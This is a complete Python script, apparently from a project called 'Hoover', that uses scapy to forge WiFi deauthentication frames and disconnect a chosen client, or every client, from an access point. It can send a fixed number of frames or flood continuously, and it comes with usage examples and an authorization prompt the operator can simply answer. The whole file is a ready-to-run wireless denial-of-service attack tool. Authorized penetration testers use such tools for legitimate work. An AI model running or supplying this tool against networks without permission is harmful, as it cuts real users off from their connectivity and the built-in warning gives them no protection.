#!/usr/bin/env python3
"""
WiFi Deauthentication Tool for Hoover
Sends deauthentication frames to disconnect clients from WiFi networks
Used for authorized security testing and network analysis
"""

import sys
import os
import argparse
import time
import subprocess
from scapy.all import *

class DeauthAttacker:
    def __init__(self, interface, target_bssid, target_client=None, channel=None):
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_client = target_client or "ff:ff:ff:ff:ff:ff"  # Broadcast if not specified
        self.channel = channel
        self.packets_sent = 0

    def validate_mac(self, mac):
        """Validate MAC address format"""
        if not mac:
            return False
        parts = mac.split(':')
        if len(parts) != 6:
            return False
        try:
            for part in parts:
                if len(part) != 2:
                    return False
                int(part, 16)
            return True
        except ValueError:
            return False

    def set_channel(self):
        """Set the wireless interface to the specified channel"""
        if not self.channel:
            return

        try:
            # Validate interface name to prevent command injection
            if not self.interface.replace('-', '').replace('_', '').isalnum():
                raise ValueError(f"Invalid interface name: {self.interface}")

            # Validate channel number
            if not isinstance(self.channel, int) or self.channel < 1 or self.channel > 14:
                raise ValueError(f"Invalid channel: {self.channel}")

            result = subprocess.run(
                ['iwconfig', self.interface, 'channel', str(self.channel)],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                print(f"[+] Set {self.interface} to channel {self.channel}")
            else:
                print(f"[!] Warning: Could not set channel: {result.stderr}")
        except subprocess.TimeoutExpired:
            print(f"[!] Warning: Timeout setting channel")
        except ValueError as e:
            print(f"[!] Error: {e}")
        except Exception as e:
            print(f"[!] Warning: Could not set channel: {e}")

    def create_deauth_packet(self):
        """Create a deauthentication packet"""
        # Deauth frame has two variations (from AP to client, and from client to AP)
        # We send both for better effectiveness

        # Packet from AP to client
        packet1 = RadioTap() / Dot11(
            type=0,
            subtype=12,
            addr1=self.target_client,  # Destination (client)
            addr2=self.target_bssid,   # Source (AP)
            addr3=self.target_bssid    # BSSID (AP)
        ) / Dot11Deauth(reason=7)  # Reason: Class 3 frame received from non-associated STA

        # Packet from client to AP
        packet2 = RadioTap() / Dot11(
            type=0,
            subtype=12,
            addr1=self.target_bssid,   # Destination (AP)
            addr2=self.target_client,  # Source (client)
            addr3=self.target_bssid    # BSSID (AP)
        ) / Dot11Deauth(reason=7)

        return [packet1, packet2]

    def send_deauth(self, count=10, delay=0.1):
        """Send deauthentication packets"""
        # Validate MAC addresses
        if not self.validate_mac(self.target_bssid):
            print(f"[!] Error: Invalid target BSSID: {self.target_bssid}")
            return False

        if not self.validate_mac(self.target_client):
            print(f"[!] Error: Invalid client MAC: {self.target_client}")
            return False

        print(f"[*] Starting deauthentication attack")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Target BSSID: {self.target_bssid}")
        print(f"[*] Target Client: {self.target_client}")
        if self.channel:
            print(f"[*] Channel: {self.channel}")
        print(f"[*] Packets to send: {count}")
        print(f"[*] Delay: {delay}s")
        print("[*] Press Ctrl+C to stop\n")

        # Set channel if specified
        self.set_channel()

        # Create deauth packets
        packets = self.create_deauth_packet()

        try:
            for i in range(count):
                for packet in packets:
                    sendp(packet, iface=self.interface, verbose=False)
                    self.packets_sent += 1

                print(f"[{i+1}/{count}] Sent deauth packets (Total: {self.packets_sent})")
                time.sleep(delay)

            print(f"\n[+] Attack completed. Sent {self.packets_sent} packets")
            return True

        except KeyboardInterrupt:
            print(f"\n\n[*] Attack stopped by user. Sent {self.packets_sent} packets")
            return False
        except Exception as e:
            print(f"\n[!] Error during attack: {e}")
            return False

    def continuous_attack(self, delay=0.1):
        """Send deauthentication packets continuously"""
        # Validate MAC addresses
        if not self.validate_mac(self.target_bssid):
            print(f"[!] Error: Invalid target BSSID: {self.target_bssid}")
            return False

        if not self.validate_mac(self.target_client):
            print(f"[!] Error: Invalid client MAC: {self.target_client}")
            return False

        print(f"[*] Starting continuous deauthentication attack")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Target BSSID: {self.target_bssid}")
        print(f"[*] Target Client: {self.target_client}")
        if self.channel:
            print(f"[*] Channel: {self.channel}")
        print(f"[*] Delay: {delay}s")
        print("[*] Press Ctrl+C to stop\n")

        # Set channel if specified
        self.set_channel()

        # Create deauth packets
        packets = self.create_deauth_packet()

        try:
            while True:
                for packet in packets:
                    sendp(packet, iface=self.interface, verbose=False)
                    self.packets_sent += 1

                # Print status every 10 packets
                if self.packets_sent % 10 == 0:
                    print(f"[*] Sent {self.packets_sent} deauth packets...")

                time.sleep(delay)

        except KeyboardInterrupt:
            print(f"\n\n[*] Attack stopped by user. Sent {self.packets_sent} packets")
            return False
        except Exception as e:
            print(f"\n[!] Error during attack: {e}")
            return False


def check_monitor_mode(interface):
    """Check if interface is in monitor mode"""
    try:
        # Validate interface name
        if not interface.replace('-', '').replace('_', '').isalnum():
            return False

        result = subprocess.run(
            ['iwconfig', interface],
            capture_output=True,
            text=True,
            timeout=5
        )

        if 'Mode:Monitor' in result.stdout:
            return True
        return False
    except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
        return False


def main():
    parser = argparse.ArgumentParser(
        description="WiFi Deauthentication Tool - Disconnect clients from WiFi networks",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Deauth all clients from an access point (10 packets)
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55

  # Deauth specific client (50 packets)
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF -n 50

  # Continuous deauth attack
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --continuous

  # Deauth with specific channel
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55 -ch 6 -n 100

Note:
  - Interface must be in monitor mode
  - Target BSSID is the MAC address of the access point
  - Target client is optional (defaults to broadcast - all clients)
  - This tool is for authorized security testing only!
        """
    )

    parser.add_argument('-i', '--interface', required=True,
                       help='Wireless interface in monitor mode')
    parser.add_argument('-b', '--bssid', required=True,
                       help='Target BSSID (MAC address of access point)')
    parser.add_argument('-c', '--client',
                       help='Target client MAC address (default: broadcast to all)')
    parser.add_argument('-n', '--count', type=int, default=10,
                       help='Number of deauth packets to send (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0.1,
                       help='Delay between packets in seconds (default: 0.1)')
    parser.add_argument('-ch', '--channel', type=int,
                       help='WiFi channel to use (optional)')
    parser.add_argument('--continuous', action='store_true',
                       help='Send deauth packets continuously until stopped')

    args = parser.parse_args()

    # Check if running as root
    if os.geteuid() != 0:
        print("[!] This tool requires root privileges (use sudo)")
        sys.exit(1)

    # Check if interface is in monitor mode
    if not check_monitor_mode(args.interface):
        print(f"[!] Warning: {args.interface} may not be in monitor mode")
        print("[!] Enable monitor mode with: sudo airmon-ng start <interface>")
        response = input("Continue anyway? (y/N): ")
        if response.lower() != 'y':
            sys.exit(1)

    # Authorization warning
    print("\n" + "="*70)
    print("WARNING: Deauthentication Attack Tool")
    print("="*70)
    print("\nThis tool sends WiFi deauthentication frames that will disconnect")
    print("clients from wireless networks. This is a DISRUPTIVE action!")
    print("\nOnly use this tool:")
    print("  - On networks you own or have written authorization to test")
    print("  - For authorized penetration testing or security research")
    print("  - In compliance with all applicable laws and regulations")
    print("\nUnauthorized use may violate:")
    print("  - Computer Fraud and Abuse Act (CFAA)")
    print("  - Federal Wiretap Act")
    print("  - Local computer crime laws")
    print("="*70)

    response = input("\nDo you have authorization to perform this attack? (yes/no): ")
    if response.lower() != 'yes':
        print("[!] Attack cancelled - Authorization required")
        sys.exit(1)

    # Create attacker instance
    attacker = DeauthAttacker(
        interface=args.interface,
        target_bssid=args.bssid,
        target_client=args.client,
        channel=args.channel
    )

    # Perform attack
    if args.continuous:
        attacker.continuous_attack(delay=args.delay)
    else:
        attacker.send_deauth(count=args.count, delay=args.delay)


if __name__ == "__main__":
    main()
